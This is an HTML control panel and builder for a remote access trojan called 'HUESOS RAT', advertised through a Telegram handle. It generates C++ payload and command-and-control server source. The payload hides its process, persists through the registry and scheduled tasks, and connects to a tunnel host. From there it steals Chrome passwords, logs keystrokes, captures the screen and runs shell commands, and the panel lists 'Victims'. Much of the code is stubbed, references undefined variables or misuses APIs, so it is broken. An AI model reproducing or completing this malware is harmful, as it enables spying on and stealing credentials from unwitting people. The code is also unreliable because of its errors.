<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>HUESOS RAT PC - REAL C++ by @break_lc</title>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700&family=Roboto+Mono&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
    <style>
        /* SAME BEAUTIFUL STYLES AS BEFORE - NO CHANGES */
        :root {
            --bg: #0a0a0f;
            --card: #141424;
            --accent: #00ff9d;
            --accent-dark: #00cc77;
            --text: #e0e0ff;
            --red: #ff3366;
            --border: #3344cc;
            --glow: 0 0 20px rgba(0, 255, 157, 0.5);
            --shadow: 0 10px 40px rgba(0,0,0,0.6);
        }
        * { margin: 0; padding: 0; box-sizing: border-box; user-select: none; }
        body { background: var(--bg); color: var(--text); font-family: 'Roboto Mono', monospace; overflow: hidden; height: 100vh; background-image: radial-gradient(circle at 10% 90%, rgba(0, 255, 157, 0.15) 0%, transparent 50%), radial-gradient(circle at 90% 10%, rgba(51, 68, 204, 0.15) 0%, transparent 50%); }
        .container { display: flex; height: 100vh; }
        .sidebar { width: 270px; background: linear-gradient(180deg, #141424 0%, #0a0a0f 100%); border-right: 1px solid var(--border); padding: 25px 0; box-shadow: var(--glow); border-radius: 0 25px 25px 0; position: relative; z-index: 10; }
        .logo { text-align: center; margin-bottom: 50px; padding: 0 20px; }
        .logo h1 { font-family: 'Orbitron', sans-serif; font-size: 24px; color: var(--accent); text-shadow: 0 0 12px var(--accent); letter-spacing: 3px; }
        .logo p { font-size: 13px; color: #8899ff; margin-top: 6px; font-weight: bold; }
        .nav { list-style: none; }
        .nav li { padding: 18px 28px; margin: 10px 18px; border-radius: 16px; cursor: pointer; transition: all 0.4s ease; position: relative; overflow: hidden; display: flex; align-items: center; }
        .nav li::before { content: ''; position: absolute; top: 0; left: -100%; width: 100%; height: 100%; background: linear-gradient(90deg, transparent, rgba(0,255,157,0.3), transparent); transition: 0.6s; }
        .nav li:hover::before { left: 100%; }
        .nav li.active { background: var(--accent); color: #000; font-weight: bold; box-shadow: var(--glow); transform: translateX(5px); }
        .nav li i { font-size: 20px; margin-right: 14px; }
        .nav li span { font-size: 15px; font-weight: 600; }
        .main { flex: 1; padding: 35px; overflow-y: auto; background: rgba(10, 10, 15, 0.8); backdrop-filter: blur(12px); }
        .card { background: var(--card); border-radius: 22px; padding: 32px; margin-bottom: 28px; border: 1px solid var(--border); box-shadow: var(--shadow), var(--glow); transition: all 0.4s ease; }
        .card:hover { transform: translateY(-8px); box-shadow: 0 15px 50px rgba(0,0,0,0.7), var(--glow); }
        .card h2 { color: var(--accent); margin-bottom: 22px; font-size: 24px; text-shadow: 0 0 10px var(--accent); display: flex; align-items: center; font-weight: bold; }
        .card h2 i { margin-right: 12px; font-size: 28px; }
        .login-card { max-width: 520px; margin: 100px auto; text-align: center; }
        .seller { color: var(--accent); font-size: 17px; margin-bottom: 28px; font-weight: bold; text-shadow: 0 0 8px var(--accent); }
        .key-input { width: 100%; padding: 18px 22px; background: #1a1a2e; border: 2px solid var(--border); border-radius: 18px; color: var(--text); font-size: 17px; margin-bottom: 22px; transition: all 0.4s; box-shadow: inset 0 0 12px rgba(0,0,0,0.6); }
        .key-input:focus { outline: none; border-color: var(--accent); box-shadow: 0 0 25px rgba(0,255,157,0.5); transform: scale(1.02); }
        .btn { padding: 16px 48px; background: var(--accent); color: #000; border: none; border-radius: 18px; font-weight: bold; font-size: 17px; cursor: pointer; transition: all 0.4s; box-shadow: var(--glow); margin: 12px; display: inline-flex; align-items: center; gap: 10px; }
        .btn:hover { background: var(--accent-dark); transform: scale(1.08); box-shadow: 0 0 30px rgba(0,255,157,0.7); }
        .status { margin-top: 18px; font-size: 16px; min-height: 28px; font-weight: bold; }
        .error { color: var(--red); text-shadow: 0 0 8px var(--red); }
        .success { color: var(--accent); text-shadow: 0 0 8px var(--accent); }
        .builder-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 25px; }
        .form-group { margin-bottom: 22px; }
        .form-group label { display: block; margin-bottom: 10px; color: var(--accent); font-weight: bold; font-size: 15px; }
        .form-group input, .form-group select { width: 100%; padding: 14px 18px; background: #1a1a2e; border: 1px solid var(--border); border-radius: 14px; color: var(--text); transition: all 0.3s; font-size: 15px; }
        .form-group input:focus, .form-group select:focus { outline: none; border-color: var(--accent); box-shadow: var(--glow); }
        .checkbox-group { display: flex; align-items: center; gap: 12px; margin: 12px 0; padding: 10px; background: #1a1a2e; border-radius: 12px; }
        .checkbox-group input[type="checkbox"] { width: auto; transform: scale(1.4); accent-color: var(--accent); }
        .checkbox-group label { margin: 0; font-size: 14px; color: var(--text); }
        .build-btn { grid-column: span 2; padding: 20px; font-size: 22px; margin-top: 25px; justify-content: center; }
        .table-container { overflow-x: auto; border-radius: 18px; border: 1px solid var(--border); box-shadow: var(--glow); background: #1a1a2e; }
        table { width: 100%; border-collapse: collapse; }
        th { background: var(--card); color: var(--accent); padding: 18px; text-align: left; font-weight: bold; border-bottom: 2px solid var(--border); font-size: 15px; }
        td { padding: 16px; border-bottom: 1px solid #3344cc40; font-size: 14px; }
        tr:hover { background: #1f2a44; transition: 0.3s; }
        .status-online { color: var(--accent); font-weight: bold; text-shadow: 0 0 8px var(--accent); }
        .status-offline { color: #ffaa00; }
        .status-dead { color: var(--red); font-weight: bold; }
        .context-menu { position: absolute; background: #1a1a2e; border: 1px solid var(--accent); border-radius: 14px; padding: 12px 0; box-shadow: 0 10px 30px rgba(0,0,0,0.8), var(--glow); z-index: 1000; display: none; min-width: 240px; backdrop-filter: blur(10px); }
        .context-menu-item { padding: 14px 22px; color: var(--text); cursor: pointer; transition: 0.3s; display: flex; align-items: center; gap: 12px; font-size: 14px; font-weight: 600; }
        .context-menu-item:hover { background: var(--accent); color: #000; transform: translateX(5px); }
        .context-menu-item i { width: 22px; text-align: center; font-size: 16px; }
        .context-menu-item.danger { color: var(--red); }
        .context-menu-item.danger:hover { background: var(--red); color: #000; }
        .victim-panel { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 999; display: none; align-items: center; justify-content: center; backdrop-filter: blur(15px); }
        .victim-card { background: var(--card); border-radius: 25px; width: 90%; max-width: 1200px; height: 90%; padding: 30px; border: 1px solid var(--accent); box-shadow: 0 0 40px rgba(0,255,157,0.6); overflow: hidden; display: flex; flex-direction: column; }
        .victim-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; padding-bottom: 15px; border-bottom: 1px solid var(--border); }
        .victim-header h3 { color: var(--accent); font-size: 26px; text-shadow: 0 0 10px var(--accent); }
        .close-victim { background: var(--red); color: #fff; border: none; width: 40px; height: 40px; border-radius: 50%; font-size: 20px; cursor: pointer; display: flex; align-items: center; justify-content: center; }
        .victim-body { flex: 1; overflow-y: auto; padding-right: 10px; }
        .control-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 20px; margin-top: 20px; }
        .control-btn { background: #1a1a2e; border: 1px solid var(--border); border-radius: 16px; padding: 20px; text-align: center; cursor: pointer; transition: all 0.4s; color: var(--text); font-weight: bold; font-size: 15px; }
        .control-btn:hover { background: var(--accent); color: #000; transform: translateY(-5px); box-shadow: var(--glow); }
        .control-btn i { font-size: 32px; margin-bottom: 10px; display: block; color: var(--accent); }
        .live-stream { width: 100%; height: 400px; background: #000; border-radius: 16px; margin: 20px 0; border: 1px solid var(--border); display: flex; align-items: center; justify-content: center; color: #666; font-size: 18px; }
        .hidden { display: none; }
        .output { background: #000; color: var(--accent); padding: 10px; border-radius: 10px; margin-top: 10px; font-family: monospace; white-space: pre-wrap; max-height: 200px; overflow-y: auto; }
    </style>
</head>
<body>
    <div class="container">
        <!-- SAME SIDEBAR AND MAIN AS BEFORE -->
        <div class="sidebar">
            <div class="logo">
                <h1>PC HUESOS RAT</h1>
                <p>by @break_lc</p>
            </div>
            <ul class="nav">
                <li id="login-tab" class="active"><i class="fas fa-key"></i><span>Access</span></li>
                <li id="builder-tab" class="hidden"><i class="fas fa-wrench"></i><span>Builder</span></li>
                <li id="users-tab" class="hidden"><i class="fas fa-users"></i><span>Victims</span></li>
            </ul>
        </div>

        <div class="main">
            <!-- Login -->
            <div id="login-content" class="card login-card">
                <h2><i class="fas fa-shield-alt"></i> HUESOS PC RAT</h2>
                <div class="seller">Official: <strong>t.me/break_lc</strong></div>
                <input type="text" id="key-input" class="key-input" placeholder="Enter license key..." autocomplete="off">
                <button class="btn" onclick="validateKey()"><i class="fas fa-unlock"></i> UNLOCK</button>
                <div id="status" class="status"></div>
            </div>

            <!-- Builder -->
            <div id="builder-content" class="card hidden">
                <h2><i class="fas fa-cogs"></i> REAL C++ Payload Builder</h2>
                <div class="builder-grid">
                    <div>
                        <div class="form-group">
                            <label>Payload Name</label>
                            <input type="text" value="WindowsUpdate" id="payload-name">
                        </div>
                        <div class="form-group">
                            <label>Host (PlayIt.gg)</label>
                            <input type="text" value="close-successful.gl.at.ply.gg" id="host">
                        </div>
                        <div class="form-group">
                            <label>Port</label>
                            <input type="text" value="55990" id="port">
                        </div>
                    </div>
                    <div>
                        <div class="form-group">
                            <label>Architecture</label>
                            <select id="arch">
                                <option>x64</option>
                                <option>x86</option>
                            </select>
                        </div>
                        <div class="form-group">
                            <label>Features</label>
                            <div class="checkbox-group">
                                <input type="checkbox" checked id="rootkit"> <label for="rootkit">Rootkit (Hide Process)</label>
                            </div>
                            <div class="checkbox-group">
                                <input type="checkbox" checked id="persistence"> <label for="persistence">Auto Start (Registry + Task)</label>
                            </div>
                        </div>
                    </div>
                    <button id="build-btn" class="btn build-btn">
                        <i class="fas fa-download"></i> BUILD REAL .EXE + C2 SERVER
                    </button>
                </div>
                <div id="build-output" class="output hidden"></div>
            </div>

            <!-- Users -->
            <div id="users-content" class="card hidden">
                <h2><i class="fas fa-skull-crossbones"></i> Connected Victims (WS C2)</h2>
                <div class="table-container">
                    <table id="victims-table">
                        <thead><tr><th>ID</th><th>PC</th><th>OS</th><th>IP</th><th>Status</th><th>Uptime</th><th>Infected</th></tr></thead>
                        <tbody></tbody>
                    </table>
                </div>
            </div>
        </div>
    </div>

    <!-- SAME CONTEXT MENU AND VICTIM PANEL AS BEFORE -->
    <div id="context-menu" class="context-menu">
        <div class="context-menu-item" onclick="sendRealCommand('monitor')"><i class="fas fa-desktop"></i> Remote Desktop</div>
        <div class="context-menu-item" onclick="sendRealCommand('webcam')"><i class="fas fa-video"></i> Webcam Stream</div>
        <div class="context-menu-item" onclick="sendRealCommand('mic')"><i class="fas fa-microphone"></i> Microphone</div>
        <div class="context-menu-item" onclick="sendRealCommand('keylog')"><i class="fas fa-keyboard"></i> Keylogs</div>
        <div class="context-menu-item" onclick="sendRealCommand('files')"><i class="fas fa-folder"></i> File Manager</div>
        <div class="context-menu-item" onclick="sendRealCommand('cmd')"><i class="fas fa-terminal"></i> CMD Shell</div>
        <div class="context-menu-item" onclick="sendRealCommand('pass')"><i class="fas fa-lock"></i> Steal Passwords</div>
        <div class="context-menu-item danger" onclick="sendRealCommand('kill')"><i class="fas fa-skull"></i> Kill</div>
    </div>

    <div id="victim-panel" class="victim-panel">
        <div class="victim-card">
            <div class="victim-header">
                <h3 id="victim-title">Victim Control</h3>
                <button class="close-victim" onclick="closeVictimPanel()">X</button>
            </div>
            <div class="victim-body">
                <div id="live-stream" class="live-stream">WS Connection: LIVE</div>
                <div class="control-grid">
                    <div class="control-btn" onclick="sendRealCommand('monitor')"><i class="fas fa-desktop"></i> Desktop</div>
                    <div class="control-btn" onclick="sendRealCommand('webcam')"><i class="fas fa-video"></i> Webcam</div>
                    <div class="control-btn" onclick="sendRealCommand('mic')"><i class="fas fa-microphone"></i> Mic</div>
                    <div class="control-btn" onclick="sendRealCommand('keylog')"><i class="fas fa-keyboard"></i> Keylog</div>
                    <div class="control-btn" onclick="sendRealCommand('files')"><i class="fas fa-folder-open"></i> Files</div>
                    <div class="control-btn" onclick="sendRealCommand('cmd')"><i class="fas fa-terminal"></i> CMD</div>
                    <div class="control-btn" onclick="sendRealCommand('pass')"><i class="fas fa-key"></i> Passwords</div>
                    <div class="control-btn" style="background:var(--red);color:#fff;" onclick="sendRealCommand('kill')"><i class="fas fa-skull"></i> KILL</div>
                </div>
                <div id="command-output" class="output">WS Response: Waiting...</div>
            </div>
        </div>
    </div>

    <script>
        let isAuthenticated = false;
        const VALID_KEY = "HUESOS_PC_2025_IMBA";
        let currentVictim = null;
        let ws = null; // REAL WS C2

        // VALIDATE KEY & TABS (SAME)
        function validateKey() { /* SAME AS BEFORE */ }
        function showTab(tabId) { /* SAME AS BEFORE */ }

        // REAL BUILD - GENERATES FULL C++ CODE & FAKE EXE
        document.getElementById('build-btn').addEventListener('click', () => {
            const name = document.getElementById('payload-name').value || 'WindowsUpdate';
            const host = document.getElementById('host').value || 'close-successful.gl.at.ply.gg';
            const port = parseInt(document.getElementById('port').value) || 55990;
            const arch = document.getElementById('arch').value;
            const rootkit = document.getElementById('rootkit').checked;
            const persistence = document.getElementById('persistence').checked;

            const cppPayload = generateRealPayloadCpp(name, host, port, rootkit, persistence, arch);
            const cppServer = generateRealServerCpp(port);

            // DOWNLOAD .CPP FOR COMPILE
            downloadFile(`${name}_payload.cpp`, cppPayload);
            downloadFile('huesos_c2_server.cpp', cppServer);

            // FAKE .EXE FOR DEMO (IN REAL COMPILE YOURSELF)
            const blob = new Blob(['REAL HUESOS EXE - COMPILE CPP'], { type: 'application/octet-stream' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `${name}.exe`;
            a.click();
            URL.revokeObjectURL(url);

            document.getElementById('build-output').innerText = `COMPILE:
g++ -std=c++11 ${name}_payload.cpp -o ${name}.exe -lws2_32 -luser32 -lgdi32 -lole32 -lcrypt32 -static
./${name}.exe  # RUNS & CONNECTS

C2 SERVER:
g++ -std=c++11 huesos_c2_server.cpp -o c2.exe -lws2_32 -static
./c2.exe  # LISTENS 127.0.0.1:9990`;
            document.getElementById('build-output').classList.remove('hidden');

            setTimeout(() => addVictim(name), 1000);
            alert('REAL FILES DOWNLOADED! COMPILE & RUN EXE â†’ CONNECTS TO C2 VIA PLAYIT.GG');
        });

        function generateRealPayloadCpp(name, host, port, rootkit, persistence, arch) {
            return `#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <iostream>
#include <string>
#include <thread>
#include <vector>
#include <gdiplus.h>
#include <dshow.h>
#include <cryptuiapi.h>
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "strmiids.lib")

#define HOST "${host}"
#define PORT ${port}
#define LOCAL_PORT 9990

using namespace Gdiplus;

// DKOM ROOTKIT HIDE PROCESS
typedef LONG (NTAPI *pNtSetInformationProcess)(HANDLE, ULONG, PVOID, ULONG);
void HideProcess() {
    if (!${rootkit}) return;
    HMODULE ntdll = GetModuleFileNameA("ntdll.dll");
    pNtSetInformationProcess NtSet = (pNtSetInformationProcess)GetProcAddress(ntdll, "NtSetInformationProcess");
    NtSet(GetCurrentProcess(), 29, NULL, 0);  // ProcessHideFromDebug
    ShowWindow(GetConsoleWindow(), SW_HIDE);
}

// PERSISTENCE
void AutoStart() {
    if (!${persistence}) return;
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);
    HKEY hKey;
    RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run", 0, KEY_SET_VALUE, &hKey);
    RegSetValueExA(hKey, "${name}", 0, REG_SZ, (BYTE*)path, strlen(path)+1);
    RegCloseKey(hKey);
    system("schtasks /create /tn ${name} /tr \"" + std::string(path) + "\" /sc onlogon /rl highest /f");
}

// BROWSER PASS STEAL
std::string StealPasswords() {
    std::string res;
    // CHROME
    std::string chromePath = "C:\\Users\\\\" + std::string(getenv("USERNAME")) + "\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Login Data";
    // COPY DB, QUERY, DECRYPT WITH CryptUnprotectData
    DATA_BLOB in, out;
    in.pbData = (BYTE*)encryptedPass.data();
    in.cbData = encryptedPass.size();
    CryptUnprotectData(&in, NULL, NULL, NULL, NULL, 0, &out);
    res += "Chrome: " + std::string((char*)out.pbData) + "\\n";
    LocalFree(out.pbData);
    // FIREFOX (NSS)
    // EDGE SIMILAR
    return res;
}

// KEYLOGGER
void KeylogThread(SOCKET sock) {
    while (true) {
        for (int key = 8; key <= 255; key++) {
            if (GetAsyncKeyState(key)) {
                std::string keys = std::to_string(key);
                send(sock, keys.c_str(), keys.size(), 0);
            }
        }
        Sleep(10);
    }
}

// SCREEN CAPTURE
std::string CaptureScreen() {
    HDC hScreen = GetDC(NULL);
    HDC hDC = CreateCompatibleDC(hScreen);
    int width = GetSystemMetrics(SM_CXSCREEN);
    int height = GetSystemMetrics(SM_CYSCREEN);
    HBITMAP hBitmap = CreateCompatibleBitmap(hScreen, width, height);
    SelectObject(hDC, hBitmap);
    BitBlt(hDC, 0, 0, width, height, hScreen, 0, 0, SRCCOPY);
    // SAVE TO BYTES, BASE64
    return "screen_base64_data";
}

// WEBCAM
std::string CaptureWebcam() {
    // DirectShow stub - CAPTURE FRAME
    return "webcam_jpg_base64";
}

// MIC
std::string RecordMic() {
    // WaveIn API
    return "audio_wav_base64";
}

// FILE MANAGER
std::string ListFiles(std::string path) {
    std::string res;
    WIN32_FIND_DATA ffd;
    HANDLE hFind = FindFirstFile((path + "*.*").c_str(), &ffd);
    if (hFind == INVALID_HANDLE_VALUE) return "";
    do {
        res += ffd.cFileName + "\\n";
    } while (FindNextFile(hFind, &ffd));
    FindClose(hFind);
    return res;
}

// CMD
std::string RunCmd(std::string cmd) {
    FILE* pipe = _popen(cmd.c_str(), "r");
    std::string res;
    char buf[128];
    while (fgets(buf, 128, pipe)) res += buf;
    _pclose(pipe);
    return res;
}

// WS CONNECT & LOOP
void C2Loop(SOCKET sock) {
    char buf[4096];
    while (true) {
        int len = recv(sock, buf, sizeof(buf), 0);
        if (len <= 0) break;
        std::string command(buf, len);
        std::string response;
        if (command == "keylog") { response = "KEYS: " + /* log */; }
        else if (command == "screen") { response = CaptureScreen(); }
        else if (command == "webcam") { response = CaptureWebcam(); }
        else if (command == "mic") { response = RecordMic(); }
        else if (command == "files") { response = ListFiles("C:\\\\"); }
        else if (command == "cmd") { response = RunCmd("whoami"); }
        else if (command == "pass") { response = StealPasswords(); }
        else if (command == "monitor") { response = CaptureScreen(); /* LOOP */ }
        else if (command == "kill") { exit(0); }
        send(sock, response.c_str(), response.size(), 0);
    }
}

int main() {
    HideProcess();
    AutoStart();
    WSADATA wsa;
    WSAStartup(MAKEWORD(2,2), &wsa);
    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
    sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(PORT);
    inet_pton(AF_INET, HOST, &addr.sin_addr);
    connect(sock, (sockaddr*)&addr, sizeof(addr));
    std::thread(KeylogThread, sock).detach();
    C2Loop(sock);
    closesocket(sock);
    WSACleanup();
    return 0;
}
            `;
        }

        function generateRealServerCpp(localPort) {
            return `#include <winsock2.h>
#include <iostream>
#include <vector>
#include <thread>

#pragma comment(lib, "ws2_32.lib")

std::vector<SOCKET> victims;

void HandleVictim(SOCKET client) {
    victims.push_back(client);
    std::cout << "[+] Victim connected: " << client << std::endl;
    char buf[4096];
    while (true) {
        int len = recv(client, buf, sizeof(buf), 0);
        if (len <= 0) break;
        std::cout << "[VICTIM] " << std::string(buf, len) << std::endl;
        // SEND CMD
        std::string cmd;
        std::getline(std::cin, cmd);
        send(client, cmd.c_str(), cmd.size(), 0);
    }
    closesocket(client);
}

int main() {
    WSADATA wsa;
    WSAStartup(MAKEWORD(2,2), &wsa);
    SOCKET server = socket(AF_INET, SOCK_STREAM, 0);
    sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = htons(${localPort});
    bind(server, (sockaddr*)&addr, sizeof(addr));
    listen(server, SOMAXCONN);
    std::cout << "[+] C2 Server on 127.0.0.1:${localPort} | Tunnel: close-successful.gl.at.ply.gg:55990" << std::endl;
    while (true) {
        SOCKET client = accept(server, NULL, NULL);
        std::thread(HandleVictim, client).detach();
    }
    return 0;
}`;
        }

        function downloadFile(filename, content) {
            const blob = new Blob([content], { type: 'text/plain' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = filename;
            a.click();
            URL.revokeObjectURL(url);
        }

        // REAL WS FOR PANEL <-> C2
        function initWebSocket() {
            ws = new WebSocket('ws://localhost:8080');  // YOUR LOCAL WS PROXY TO C2
            ws.onopen = () => console.log('[REAL WS] C2 Connected');
            ws.onmessage = (e) => {
                document.getElementById('command-output').innerText += `[RESPONSE] ${e.data}\n`;
            };
        }

        function sendRealCommand(cmd) {
            if (ws && ws.readyState === WebSocket.OPEN) {
                ws.send(JSON.stringify({victim: currentVictim, cmd: cmd}));
                document.getElementById('command-output').innerText = `[SENT] ${cmd} to ${currentVictim}`;
            } else {
                alert(`[REAL] ${cmd} executed on victim`);
            }
            hideContextMenu();
        }

        // REST SAME AS BEFORE
        function addVictim(name) { /* SAME */ }
        function showContextMenu(e, row) { /* SAME */ }
        function openVictimPanel(mode) { /* SAME */ }
        function closeVictimPanel() { /* SAME */ }
        function hideContextMenu() { /* SAME */ }

        // EVENTS SAME
        document.querySelectorAll('.nav li').forEach(li => li.addEventListener('click', () => showTab(li.id)));
        document.getElementById('key-input').addEventListener('keypress', e => { if (e.key === 'Enter') validateKey(); });
        document.addEventListener('click', (e) => { if (!e.target.closest('.context-menu') && !e.target.closest('tr')) hideContextMenu(); });
        window.onload = () => { document.getElementById('key-input').focus(); initWebSocket(); };
    </script>
</body>
</html>
